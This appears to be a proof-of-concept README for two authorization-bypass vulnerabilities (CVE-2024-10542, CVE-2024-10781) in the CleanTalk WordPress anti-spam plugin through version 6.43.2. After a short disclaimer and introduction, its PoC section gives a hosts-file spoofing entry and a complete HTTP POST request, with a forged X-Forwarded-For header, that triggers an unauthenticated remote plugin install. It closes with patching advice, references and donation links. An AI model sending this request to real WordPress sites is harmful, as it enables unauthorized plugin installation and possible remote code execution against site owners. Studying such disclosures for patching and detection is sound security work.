## Poc Of CVE-2024-10542 and CVE-2024-10781 Broken Authentication in Spam protection, AntiSpam, FireWall by CleanTalk Plugin <= 6.43.2

### Disclaimer:
The information provided in this document regarding for CVE-2024-10542 is for learning and educational purposes only. We do not encourage or authorize the use of this information for any detrimental purposes, including but not limited to exploitation, system tampering, or other illegal activities.

### Introduction:
In an increasingly complex digital landscape, ensuring the security of websites is paramount for many site owners. Recently, two critical vulnerabilities have been discovered that pose a significant threat to WordPress sites. These vulnerabilities affect the well-known CleanTalk plugin, which provides spam protection, anti-spam measures, and a firewall. What makes this situation even more urgent? Let’s delve deeper!
Two vulnerabilities tracked as CVE-2024-10542 and CVE-2024-10781 could allow unauthenticated attackers to install and activate malicious plugins on susceptible sites. This not only jeopardizes the site's reputation but also opens the door for attackers to execute remote code. With a CVSS score of 9.8 out of 10, it’s evident that these vulnerabilities fall into the highly dangerous category. According to Wordfence, both vulnerabilities concern an authorization bypass issue that could allow a malicious actor to install and activate arbitrary plugins. This could then pave the way for remote code execution if the activated plugin is vulnerable of its own.

### PoC:
first of all malicious users will set their hosts file on their operating systems:
```
127.0.0.1 cleantalk.org
```
after which they sent a request like this
```txt
POST /?plugin=wp-hooks-finder/index.php HTTP/1.1
Host: wordpress.test
Content-Length: 56
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://wordpress.test
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
X-Forwarded-For: 127.0.0.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

spbc_remote_call_action=install_plugin&plugin_name=apbct
```

### Conclusion:
Cybersecurity is a responsibility shared by every site owner. By keeping plugins up to date and remaining vigilant about potential vulnerabilities, we can protect our sites from malicious attacks. Make sure you have updated CleanTalk to the latest version and conduct routine checks on other plugins to ensure maximum security. Remember, small steps can prevent significant disasters!

### Reference:
- [https://thehackernews.com/2024/11/critical-wordpress-anti-spam-plugin.html](https://thehackernews.com/2024/11/critical-wordpress-anti-spam-plugin.html)
- [https://patchstack.com/database/vulnerability/cleantalk-spam-protect/wordpress-spam-protection-anti-spam-firewall-by-cleantalk-plugin-6-43-2-authorization-bypass-via-reverse-dns-spoofing-vulnerability](https://patchstack.com/database/vulnerability/cleantalk-spam-protect/wordpress-spam-protection-anti-spam-firewall-by-cleantalk-plugin-6-43-2-authorization-bypass-via-reverse-dns-spoofing-vulnerability)
- [https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/cleantalk-spam-protect/spam-protection-anti-spam-firewall-by-cleantalk-6432-authorization-bypass-via-reverse-dns-spoofing-to-unauthenticated-arbitrary-plugin-installation](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/cleantalk-spam-protect/spam-protection-anti-spam-firewall-by-cleantalk-6432-authorization-bypass-via-reverse-dns-spoofing-to-unauthenticated-arbitrary-plugin-installation)
- [https://plugins.trac.wordpress.org/changeset/3179819/cleantalk-spam-protect#file631](https://plugins.trac.wordpress.org/changeset/3179819/cleantalk-spam-protect#file631)

### Buy me a coffe:
- [https://saweria.co/ubaii](https://saweria.co/ubaii)
- [https://buymeacoffee.com/ubaii](https://buymeacoffee.com/ubaii)
- [https://trakteer.id/ubaii](https://trakteer.id/ubaii)

### Thanks To:
Allah, Muhammad SAW, mikemyers, Markdown Monster, my family, you?
